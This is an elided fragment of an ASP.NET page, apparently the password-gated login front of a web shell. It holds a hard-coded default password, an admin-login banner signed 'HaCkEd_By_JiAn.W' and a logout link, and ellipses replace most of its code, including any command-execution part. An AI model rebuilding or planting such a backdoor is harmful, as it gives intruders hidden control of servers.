...
<script runat="server">
Dim PASSWORD as string = "51j"   '这里把“51j”改为你自己的密码
...
Sub Login_click(sender As Object, E As EventArgs)
	if Textbox.Text=PASSWORD then     
		...
		response.Write("<div align=center><font color='red'>密码错误！</font></div>")
	end if
End Sub
	...
	<body>
						...
						<TABLE cellSpacing="0" cellPadding="0" width="468" border="0">
							<tr>
								<TD align="left"><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b>管理登录 
											:::...</b></TD>
								<TD align="right"><FONT color="#d2d8ec">HaCkEd_By_JiAn.W</FONT></TD>
							</tr>
		...
		<TABLE class="showMenu" width="100%" border="0" cellpadding="1" cellspacing="1">
			<tr>
				...
				<TD align="right">Powered By <b>娇娘</b>&nbsp;<a href="?action=logout" title="Exit"><FONT face="webdings" color="red">r<font></a>&nbsp;</TD>
			</tr>
		</TABLE>
